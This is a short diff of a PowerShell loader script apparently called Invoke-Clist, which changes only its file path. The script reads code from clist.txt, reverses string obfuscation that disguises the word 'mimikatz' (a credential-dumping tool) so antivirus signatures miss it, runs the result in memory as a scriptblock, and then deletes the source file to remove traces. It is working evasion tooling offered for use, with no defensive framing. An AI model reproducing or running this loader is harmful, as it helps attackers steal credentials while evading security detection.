@@ -3,12 +3,12 @@
 # Copy/paste into ps to load code
 # Invoke-Clist
 
-# Modify file path as needed
-$strCPath = (get-location).path + "\clist.txt"
+# MODIFY CODE FILE PATH AS NEEDED
+
+$strCPath = "clist.txt"
 try{$strCode = [io.file]::ReadAllText($strCPath)} catch{} finally{}
 $strCode = $strCode -replace "Nooote", "NoteProperty"
 $strCode = $strCode -replace "meemeemeow", "mimikatz"
 $strCode = [scriptblock]::Create($strCode)
 .$strCode
-
 try{rm $strCPath} catch{} finally{}
